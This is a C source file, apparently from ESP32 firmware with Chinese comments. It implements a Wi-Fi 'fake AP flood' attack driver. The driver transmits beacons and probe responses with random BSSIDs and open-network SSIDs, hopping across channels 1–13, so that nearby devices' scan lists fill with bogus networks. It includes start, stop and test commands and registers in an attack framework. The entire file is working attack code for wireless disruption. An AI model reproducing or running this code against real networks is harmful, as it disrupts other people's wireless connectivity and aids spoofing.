// SPDX-License-Identifier: Apache-2.0
// SPDX-FileCopyrightText: 2026 XDUPWW

// 假 AP 洪泛：随机 BSSID + 随机 SSID 的 beacon 和 probe response，把周围的
// 扫描结果表塞满。

#include <string.h>

#include "attacks/attack.h"
#include "attacks/attack_common.h"
#include "esp_random.h"
#include "hal_wifi/hal_wifi.h"
#include "wbus/wbus.h"
#include "wifi_frame/frame_build.h"
#include "wifi_frame/frames.h"
#include "wifi_frame/ie_build.h"

#define OWNER "probe"
#define DEFAULT_CHANNEL 6
#define BEACON_INTERVAL 100
// ESS + short slot，不带 RSN：客户端看到的就是一个开放网络
#define CAPAB_OPEN 0x0401
#define SSID_MAX_LEN 12

static bool s_active;
static uint8_t s_channel;
static bool s_fixed_channel;
static uint32_t s_frames;
static uint32_t s_beacons;
static uint32_t s_probe_resp;
static uint32_t s_last_hop_ms;

static void random_ssid(char *out, size_t cap) {
    static const char kAlphabet[] = "abcdefghijklmnopqrstuvwxyz0123456789";
    const uint32_t len = 4 + (esp_random() % (SSID_MAX_LEN - 4));
    const uint32_t size = (len < cap - 1) ? len : (uint32_t)(cap - 1);
    for (uint32_t i = 0; i < size; i++) {
        out[i] = kAlphabet[esp_random() % (sizeof(kAlphabet) - 1)];
    }
    out[size] = '\0';
}

static int build_fake_ap(uint8_t *buf, size_t cap, bool probe_resp, const uint8_t bssid[6],
                         const char *ssid) {
    uint8_t ies[96];
    wf_ie_writer_t w;
    wf_ie_begin(&w, ies, sizeof(ies));
    wf_ie_ssid(&w, ssid, strlen(ssid));
    wf_ie_rates(&w, 1, 0x0C);
    wf_ie_ds(&w, s_channel);
    if (!wf_ie_ok(&w)) {
        return -1;
    }
    static const uint8_t kBcast[6] = WF_BROADCAST_ADDR_INIT;
    if (probe_resp) {
        return wf_build_probe_resp(buf, cap, kBcast, bssid, 0, BEACON_INTERVAL, CAPAB_OPEN, ies,
                                   wf_ie_len(&w));
    }
    return wf_build_beacon(buf, cap, bssid, 0, BEACON_INTERVAL, CAPAB_OPEN, ies, wf_ie_len(&w));
}

static void probe_tick(uint32_t now_ms) {
    if (!s_active) {
        return;
    }
    if (!s_fixed_channel && (s_last_hop_ms == 0 || now_ms - s_last_hop_ms >= 150)) {
        s_last_hop_ms = now_ms;
        s_channel = (uint8_t)((s_channel % 13) + 1);
        hal_wifi_channel_select(OWNER, s_channel);
    }

    static uint8_t frame[WF_FRAME_CAP];
    uint8_t bssid[6];
    char ssid[SSID_MAX_LEN + 1];
    attack_random_mac(bssid);
    random_ssid(ssid, sizeof(ssid));

    // 一问一答两种帧交替：主动扫描的客户端认 probe response，被动等的认 beacon
    const bool probe_resp = (s_frames & 1) != 0;
    const int len = build_fake_ap(frame, sizeof(frame), probe_resp, bssid, ssid);
    if (len > 0 && hal_wifi_tx(frame, (uint16_t)len) == ESP_OK) {
        s_frames++;
        if (probe_resp) {
            s_probe_resp++;
        } else {
            s_beacons++;
        }
    }
}

static const wb_policy_t kStartPolicy[] = {
    // 0 = auto（自己跳 1..13），给个具体信道就钉在那儿
    {.name = "ch", .type = WB_T_CHANNEL, .required = false, .min = 0, .max = 13, .def = 0},
};

static esp_err_t probe_start(wb_args_t *args, wb_reply_t *reply) {
    const int channel = wb_args_channel(args, "ch");
    attack_exclusive();
    s_fixed_channel = (channel > 0);
    s_channel = s_fixed_channel ? (uint8_t)channel : DEFAULT_CHANNEL;
    s_frames = 0;
    s_beacons = 0;
    s_probe_resp = 0;
    s_last_hop_ms = 0;

    const esp_err_t err = hal_wifi_channel_acquire(OWNER, HAL_CH_ROAMING, 0, 0);
    if (err != ESP_OK) {
        wb_reply_fail(reply, "射频被占着（%s）", esp_err_to_name(err));
        return err;
    }
    hal_wifi_channel_select(OWNER, s_channel);
    s_active = true;
    attack_emit("probe", true, "ch=%u", (unsigned)s_channel);
    wb_reply_line(reply, "probe 开跑 ch=%u %s", (unsigned)s_channel,
                  s_fixed_channel ? "固定" : "自动跳 1..13");
    return ESP_OK;
}

static void probe_stop(void) {
    if (!s_active) {
        return;
    }
    s_active = false;
    attack_unpin(OWNER);
    attack_emit("probe", false, NULL);
}

static esp_err_t probe_stop_cmd(wb_args_t *args, wb_reply_t *reply) {
    (void)args;
    const uint32_t frames = s_frames;
    const uint32_t beacons = s_beacons;
    const uint32_t responses = s_probe_resp;
    probe_stop();
    attack_report_rate(reply, "probe", frames);
    wb_reply_line(reply, "beacon=%u response=%u", (unsigned)beacons, (unsigned)responses);
    return ESP_OK;
}

static esp_err_t probe_test(wb_args_t *args, wb_reply_t *reply) {
    (void)args;
    uint8_t frame[WF_FRAME_CAP];
    const uint8_t bssid[6] = {0x02, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE};

    int len = build_fake_ap(frame, sizeof(frame), false, bssid, "lab");
    if (len <= 0) {
        wb_reply_fail(reply, "beacon 组帧失败");
        return ESP_FAIL;
    }
    wb_reply_line(reply, "beacon len=%d subtype=0x%02X", len, frame[0] & 0xF0);

    len = build_fake_ap(frame, sizeof(frame), true, bssid, "lab");
    if (len <= 0) {
        wb_reply_fail(reply, "probe response 组帧失败");
        return ESP_FAIL;
    }
    wb_reply_line(reply, "response len=%d subtype=0x%02X", len, frame[0] & 0xF0);
    return ESP_OK;
}

static const wb_method_t kMethods[] = {
    {"start", probe_start, "[ch=auto|1..13]", kStartPolicy, 1},
    {"stop", probe_stop_cmd, "", NULL, 0},
    {"test", probe_test, "", NULL, 0},
};

static const wb_object_t kObject = {
    .name = "probe",
    .methods = kMethods,
    .n_methods = sizeof(kMethods) / sizeof(kMethods[0]),
};

static uint32_t probe_frames(void) {
    return s_frames;
}

static bool probe_active(void) {
    return s_active;
}

static const attack_driver_t kDriver = {
    .name = "probe",
    .object = &kObject,
    .stop = probe_stop,
    .tick = probe_tick,
    .frames = probe_frames,
    .active = probe_active,
};

const attack_driver_t *probe_attack(void) {
    return &kDriver;
}
